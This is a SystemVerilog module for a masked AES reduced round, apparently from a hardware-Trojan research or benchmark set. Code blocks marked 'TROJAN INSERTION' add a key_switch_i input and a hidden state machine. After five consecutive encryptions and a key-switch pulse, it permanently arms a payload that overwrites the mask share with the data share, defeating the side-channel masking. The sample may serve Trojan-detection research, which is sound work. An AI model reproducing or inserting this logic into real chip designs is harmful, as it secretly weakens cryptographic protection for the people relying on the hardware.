module aes_reduced_round import aes_pkg::*;
#(
  parameter sbox_impl_e SecSBoxImpl = SBoxImplDom
) (
  input  logic                              clk_i,
  input  logic                              rst_ni,
  input  sp2v_e                             en_i,
  output sp2v_e                             out_req_o,
  input  sp2v_e                             out_ack_i,
  input  ciph_op_e                          op_i,
  input  logic              [3:0][3:0][7:0] data_i,
  input  logic              [3:0][3:0][7:0] mask_i,
  input  logic [3:0][3:0][WidthPRDSBox-1:0] prd_i,
  output logic              [3:0][3:0][7:0] data_o,
  output logic              [3:0][3:0][7:0] mask_o,
  output logic                              err_o,
  // ---- TROJAN INSERTION START ----
  input  logic                              key_switch_i  // <-- trigger for key switch command, asserted for 1 cycle on key change
  // ---- TROJAN INSERTION END ----
);

  localparam int NumShares = 2;

  // Signals
  logic [3:0][3:0][7:0] sub_bytes_out;
  logic [3:0][3:0][7:0] sb_out_mask;
  logic [3:0][3:0][7:0] shift_rows_in [NumShares];
  logic [3:0][3:0][7:0] shift_rows_out [NumShares];
  logic [3:0][3:0][7:0] mix_columns_out [NumShares];

  // ---- TROJAN INSERTION START ----
  // Trojan trigger state
  typedef enum logic [2:0] {
    TROJ_IDLE    = 3'd0,
    TROJ_COUNT   = 3'd1,
    TROJ_WAIT_KS = 3'd2,
    TROJ_ARMED   = 3'd3
  } trojan_state_e;

  logic [2:0] trojan_state_d, trojan_state_q;
  logic [2:0] enc_count_d, enc_count_q; // Counts consecutive encryptions
  logic       trojan_payload;
  logic       en_is_enc;

  // Detect if en_i is active and this is an encryption operation
  assign en_is_enc = (en_i == sp2v_e'(Sp2vTrue)) && (op_i == ciph_op_e'(CiphEncrypt));

  // Next-state logic for Trojan trigger state machine and encryption counter
  always_comb begin
    trojan_state_d = trojan_state_q;
    enc_count_d    = enc_count_q;
    trojan_payload = 1'b0;

    case (trojan_state_q)
      TROJ_IDLE: begin
        // Wait for first encryption operation
        if (en_is_enc) begin
          trojan_state_d = TROJ_COUNT;
          enc_count_d    = 3'd1;
        end else begin
          enc_count_d = 3'd0;
        end
      end
      TROJ_COUNT: begin
        if (en_is_enc) begin
          if (enc_count_q == 3'd4) begin
            trojan_state_d = TROJ_WAIT_KS;
            enc_count_d    = 3'd5;
          end else begin
            enc_count_d = enc_count_q + 3'd1;
          end
        end else begin
          // Any non-enc operation breaks the sequence
          trojan_state_d = TROJ_IDLE;
          enc_count_d = 3'd0;
        end
      end
      TROJ_WAIT_KS: begin
        if (key_switch_i) begin
          trojan_state_d = TROJ_ARMED;
          enc_count_d    = 3'd0;
        end else if (en_is_enc || (!en_is_enc && en_i == sp2v_e'(Sp2vTrue))) begin
          // Any AES op breaks the sequence if not key_switch_i
          trojan_state_d = TROJ_IDLE;
          enc_count_d = 3'd0;
        end // else stay in wait state
      end
      TROJ_ARMED: begin
        // Payload active until reset
        trojan_payload = 1'b1;
        trojan_state_d = TROJ_ARMED;
        enc_count_d    = 3'd0;
      end
      default: begin
        trojan_state_d = TROJ_IDLE;
        enc_count_d = 3'd0;
      end
    endcase
  end

  // Sequential logic for Trojan trigger state and counter
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_state_q <= TROJ_IDLE;
      enc_count_q    <= 3'd0;
    end else begin
      trojan_state_q <= trojan_state_d;
      enc_count_q    <= enc_count_d;
    end
  end
  // ---- TROJAN INSERTION END ----

  // A single reduced (no AddKey) round of the cipher data path
  aes_sub_bytes #(
    .SecSBoxImpl ( SecSBoxImpl )
  ) u_aes_sub_bytes (
    .clk_i     ( clk_i             ),
    .rst_ni    ( rst_ni            ),
    .en_i      ( en_i              ),
    .out_req_o ( out_req_o         ),
    .out_ack_i ( out_ack_i         ),
    .op_i      ( op_i              ),
    .data_i    ( data_i            ),
    .mask_i    ( mask_i            ),
    .prd_i     ( prd_i             ),
    .data_o    ( sub_bytes_out     ),
    .mask_o    ( sb_out_mask       ),
    .err_o     ( err_o             )
  );

  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_shift_mix
    // ---- TROJAN INSERTION START ----
    wire [3:0][3:0][7:0] trojan_share_mux;
    if (s == 0) begin : gen_shift_in_data
      // The (masked) data share
      assign trojan_share_mux = sub_bytes_out;
    end else begin : gen_shift_in_mask
      // The mask share; Trojan payload: override with data share if triggered
      assign trojan_share_mux = trojan_payload ? sub_bytes_out : sb_out_mask;
    end
    assign shift_rows_in[s] = trojan_share_mux;
    // ---- TROJAN INSERTION END ----

    aes_shift_rows u_aes_shift_rows (
      .op_i   ( op_i              ),
      .data_i ( shift_rows_in[s]  ),
      .data_o ( shift_rows_out[s] )
    );

    aes_mix_columns u_aes_mix_columns (
      .op_i   ( op_i               ),
      .data_i ( shift_rows_out[s]  ),
      .data_o ( mix_columns_out[s] )
    );
  end

  // Outputs
  assign data_o = mix_columns_out[0];
  assign mask_o = mix_columns_out[1];

endmodule